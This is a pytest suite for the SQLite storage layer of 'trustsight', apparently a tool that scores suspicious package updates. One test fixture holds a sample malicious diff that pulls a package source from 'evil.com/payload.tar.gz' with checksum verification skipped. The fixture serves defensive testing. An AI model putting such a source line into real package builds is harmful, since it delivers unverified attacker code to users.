import pytest

from trustsight.db import (
    get_all_packages,
    get_connection,
    get_history,
    get_last_analysis,
    get_package,
    get_package_id,
    get_triggered_rules,
    init_db,
    insert_analysis,
    update_package_version,
    upsert_package,
)


@pytest.fixture
def db(tmp_path, monkeypatch):
    monkeypatch.setattr("trustsight.db.DATA_DIR", tmp_path)
    init_db()
    yield
    (tmp_path / "trustsight.db").unlink(missing_ok=True)


def test_init_db_creates_tables(db):
    conn = get_connection()
    tables = conn.execute("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name").fetchall()
    table_names = [r["name"] for r in tables]
    assert "packages" in table_names
    assert "source_urls" in table_names
    assert "maintainers" in table_names
    assert "analysis_history" in table_names
    assert "triggered_rules" in table_names
    conn.close()


def test_upsert_package_new(db):
    pid = upsert_package("testpkg", "1.0.0")
    assert isinstance(pid, int)
    assert pid > 0


def test_upsert_package_existing(db):
    pid1 = upsert_package("testpkg", "1.0.0")
    pid2 = upsert_package("testpkg", "2.0.0")
    assert pid1 == pid2  # same package returns same id via name lookup


def test_get_package_id_found(db):
    upsert_package("myapp", "1.0")
    pid = get_package_id("myapp")
    assert pid is not None
    assert isinstance(pid, int)


def test_get_package_id_not_found(db):
    pid = get_package_id("nonexistent")
    assert pid is None


def test_get_package_found(db):
    upsert_package("myapp", "1.0")
    pkg = get_package("myapp")
    assert pkg is not None
    assert pkg["name"] == "myapp"
    assert pkg["current_version"] == "1.0"


def test_get_package_not_found(db):
    pkg = get_package("nonexistent")
    assert pkg is None


def test_update_package_version(db):
    upsert_package("myapp", "1.0")
    update_package_version("myapp", "2.0")
    pkg = get_package("myapp")
    assert pkg["current_version"] == "2.0"


def test_insert_analysis(db):
    pid = upsert_package("myapp", "1.0")
    triggered = [{"rule_id": "R001", "severity": "CRITICAL"}]
    hid = insert_analysis(
        package_id=pid,
        old_version="1.0",
        new_version="2.0",
        old_commit="abc123",
        new_commit="def456",
        final_score=85,
        raw_diff="+echo hello",
        fact_json='{"package_name": "myapp"}',
        triggered_rules=triggered,
    )
    assert isinstance(hid, int)
    assert hid > 0


def test_get_last_analysis_none(db):
    pid = upsert_package("myapp", "1.0")
    last = get_last_analysis(pid)
    assert last is None


def test_get_last_analysis_found(db):
    pid = upsert_package("myapp", "1.0")
    insert_analysis(pid, "1.0", "2.0", "abc", "def", 50, "+diff", "{}", [])
    insert_analysis(pid, "2.0", "3.0", "def", "ghi", 85, "+diff2", "{}", [])
    last = get_last_analysis(pid)
    assert last is not None
    assert last["final_score"] == 85
    assert last["new_commit"] == "ghi"


def test_get_triggered_rules(db):
    pid = upsert_package("myapp", "1.0")
    rules = [{"rule_id": "R001", "severity": "CRITICAL"}, {"rule_id": "R004", "severity": "HIGH"}]
    hid = insert_analysis(pid, "1.0", "2.0", "a", "b", 65, "+d", "{}", rules)
    stored = get_triggered_rules(hid)
    assert len(stored) == 2
    assert stored[0]["rule_id"] in ("R001", "R004")


def test_get_history(db):
    pid = upsert_package("myapp", "1.0")
    for i in range(5):
        insert_analysis(pid, f"{i}.0", f"{i+1}.0", "a", "b", i * 10, "+d", "{}", [])
    history = get_history(pid, limit=3)
    assert len(history) == 3
    assert history[0]["final_score"] == 40  # most recent first


def test_get_all_packages(db):
    upsert_package("alpha", "1.0")
    upsert_package("beta", "2.0")
    pkgs = get_all_packages()
    names = [p["name"] for p in pkgs]
    assert "alpha" in names
    assert "beta" in names


def test_source_url_unique_constraint(db):
    upsert_package("testpkg", "1.0")
    pid = get_package_id("testpkg")
    conn = get_connection()
    conn.execute(
        "INSERT INTO source_urls (url, first_seen_package_id, first_seen_globally_timestamp) VALUES (?, ?, datetime('now'))",
        ("https://unique-url.com/pkg.tar.gz", pid),
    )
    conn.commit()
    with pytest.raises(Exception):
        conn.execute(
            "INSERT INTO source_urls (url, first_seen_package_id) VALUES (?, ?)",
            ("https://unique-url.com/pkg.tar.gz", pid),
        )
        conn.commit()
    conn.close()


def test_foreign_key_enforced(db):
    with pytest.raises(Exception):
        conn = get_connection()
        conn.execute(
            "INSERT INTO analysis_history (package_id, old_version, new_version) VALUES (99999, '1.0', '2.0')",
        )
        conn.commit()
        conn.close()


def test_analysis_stores_diff_blob(db):
    pid = upsert_package("myapp", "1.0")
    diff = "+source=('https://evil.com/payload.tar.gz')\n+sha256sums=('SKIP')"
    hid = insert_analysis(pid, "1.0", "2.0", "a", "b", 85, diff, "{}", [])
    conn = get_connection()
    row = conn.execute("SELECT raw_diff_blob FROM analysis_history WHERE id = ?", (hid,)).fetchone()
    conn.close()
    assert row is not None
    assert "evil.com" in row["raw_diff_blob"]


def test_init_db_idempotent(db):
    init_db()
    init_db()
    init_db()
    conn = get_connection()
    tables = conn.execute("SELECT count(*) as cnt FROM sqlite_master WHERE type='table'").fetchone()
    conn.close()
    assert tables["cnt"] >= 5
